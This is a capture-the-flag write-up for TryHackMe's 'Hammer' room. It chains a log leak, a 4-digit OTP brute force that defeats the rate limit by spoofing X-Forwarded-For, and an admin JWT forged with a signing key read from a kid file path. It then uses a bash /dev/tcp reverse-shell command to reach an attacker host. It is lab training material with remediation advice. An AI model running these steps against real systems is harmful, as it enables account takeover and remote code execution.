# Hammer — TryHackMe Writeup

> **Room:** [Hammer](https://tryhackme.com/room/hammer) · **Difficulty:** Medium
> **Category:** Web / Auth bypass → JWT forgery → RCE
> **Author of writeup:** 0xnyx
> **Goal:** Beat a rate-limited OTP reset for a user session, then forge an admin JWT for command execution.

> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/hammer), **no flags, codes, or key values are included** — only the method.

---

## How to read this writeup

Each step: **Do** → **You get** → **Why / what next**.

---

## Step 1 — Recon

**Do** — Scan; the web app is on a non-standard port.

```bash
nmap -sVC -p- -T4 -Pn <TARGET>
```

**You get**

```
22   ssh
1337 http   (the app)
```

**Do** — Directory brute on :1337. The app uses `hmr_`-prefixed dirs.

```bash
feroxbuster -u http://<TARGET>:1337 -w /usr/share/wordlists/dirb/common.txt
```

**You get** — `hmr_logs/`, and inside it an **`error.logs`** that leaks a valid account email: **tester@hammer.thm**.

**Why / what next** — A real email unlocks the password-reset flow. The JS/cookies show the app uses **`firebase/php-jwt`** → JWT-based auth (remember this for later).

---

## Step 2 — Foothold (OTP brute via rate-limit bypass)

**Do** — The "Forgot Password" flow emails a **4-digit** recovery code to `reset_password.php`. There's a rate limit, but it's keyed on client IP — spoof it with a rotating `X-Forwarded-For` to bypass it, then brute all 0000–9999.

```bash
# Burp Intruder: X-Forwarded-For = payload set 1 (random/rotating),
#                recovery_code  = payload set 2 (0000..9999)
```

**You get** — The valid code → reset tester's password → log in → **Flag 1** on the dashboard (user "Thor", role `user`).

**Why / what next** — There's a command-exec feature, but it's gated by role `admin`. We're `user`. Time to attack the JWT.

---

## Step 3 — Privesc (forge an admin JWT)

**Do** — Inspect the session JWT. Its header carries a **`kid`** (key ID) pointing at a signing-key **file path**. Pull that file — it's web-accessible.

```bash
curl -s http://<TARGET>:1337/188ade1.key
```

**You get** — The raw signing key (a short hex string). The app signs HS256 JWTs with this key **as a plain string** (not hex-decoded).

**Why / what next** — With the key, forge a token with `role: admin`, keeping the same `kid` file path so the server loads the same key to verify it:

```python
import jwt
key = open("188ade1.key").read().strip()
tok = jwt.encode({"role":"admin","email":"tester@hammer.thm"}, key,
                 algorithm="HS256", headers={"kid":"/var/www/html/188ade1.key"})
print(tok)
```

**Do** — Send the forged token to the command-exec endpoint, then catch a shell (nc listener first):

```bash
curl http://<TARGET>:1337/<cmd-endpoint> -H "Authorization: Bearer <forged-jwt>" \
  --data 'cmd=bash -c "bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1"'
```

**You get** — A **www-data** shell → **Flag 2** in `/home/ubuntu/`.

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | `hmr_logs/error.logs` | Valid email tester@hammer.thm |
| 2 | XFF rate-limit bypass + 4-digit OTP brute | User session (Flag 1) |
| 3 | `kid`-referenced key leak → forge `role:admin` JWT | Admin RCE → shell (Flag 2) |

## Lessons

- Log directories (`hmr_logs/`) leak valid identifiers — always brute for them.
- **IP-based rate limits die to `X-Forwarded-For` spoofing**; a 4-digit code is only 10k attempts.
- A JWT **`kid`** pointing at a file path is a gift: if the key file is readable, you own the signing key and can forge any claim (`role:admin`).

## Remediation

- Don't expose logs; don't leak account identifiers.
- Rate-limit on server identity, not client-supplied headers; lock OTP attempts per account.
- Never let `kid` reference an attacker-readable/controllable path; pin the verification key server-side.

---

*Write-up for [TryHackMe — Hammer](https://tryhackme.com/room/hammer).*
